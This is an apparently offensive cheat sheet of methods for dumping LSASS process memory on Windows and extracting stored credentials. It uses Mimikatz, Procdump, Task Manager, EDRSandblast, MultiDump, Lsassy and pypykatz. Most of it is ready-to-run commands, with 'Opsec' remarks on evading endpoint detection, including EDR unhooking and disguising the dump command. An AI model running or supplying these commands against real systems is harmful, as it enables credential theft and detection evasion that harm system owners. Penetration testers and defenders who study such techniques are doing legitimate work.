# Methods

## via Mimikatz

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords 
```

## via Procdump.exe & comsvc.dll
First, get "lsass.exe" PID:
```
tasklist /fi "imagename eq lsass.exe"
```
Then you can dump the memory of a process:
```
procdump -accepteula -ma [lsass.exe PID] lsass.dmp
```

**Opsec:** The procdump inline command and the dump file could be spotted, you should take a look at "MultiDump"

## via the Taskmanager

Once logged in with an privileged account on a the machine (via RDP, for example), it is possible to dump processus memory by performing the following actions:

1/ Open "Task Manager" 
2/ In the "Details" tab, select the process "lsass.exe".
3/ Right-click on this process and select "Create dump file".
4/ Extract secrets from this file with pypykatz or mimikatz. (see part "Open memory dump files")

**Opsec:** Is generally spotted by defensive components

## via EDRSandblast

Only compile EDRSandblast and execute it:
```
.\EDRSandblast.exe dump --process-name lsass.exe -o .\lsass.dmp
```
**Opsec:** EDR unhooking could be noisy and spotted 


## via MultiDump

MultiDump supports LSASS dump via ProcDump.exe or comsvc.dll. It calls these Microsoft tools in a suspended thread, with a non-dangerous parameters. 
The processus then changes the inline commands (to dump the memory of lsass.exe) and resume the thread:
```
> MultiDump.exe
> MultiDump.exe --procdump procdump.exe
```
Then use the given python script to decrypt and parse the dump :

```
ProcDumpHandler.py -f [dump] -k [key]
```
https://github.com/Xre0uS/MultiDump

**Opsec:** 

## via EDRSandblast


https://github.com/wavestone-cdt/EDRSandblast
```
EDRSandblast.exe dump
```


##  Lsassy 
It implements a lot of LSASS.exe memory dump methods such as comsvcs, comsvcs_stealth, dllinject, dumpert, dumpertdll, edrsandblast, mirrordump, nanodump, ppldump, procdump, rawrpc, rdrleakdiag, silentprocessexit, sqldumper, wer. 

```
lsassy -u username -d domain [-H NT hash] [-p password] -m chosen_method target
```

**Opsec:** Embedded methods contain bytecode which can be known by defensive component 

## Open memory dump files

```
mimikatz.exe "sekurlsa::minidump dump_file" "sekurlsa::logonPasswords full" exit
```
```
pypykatz lsa minidump process.dmp 
```
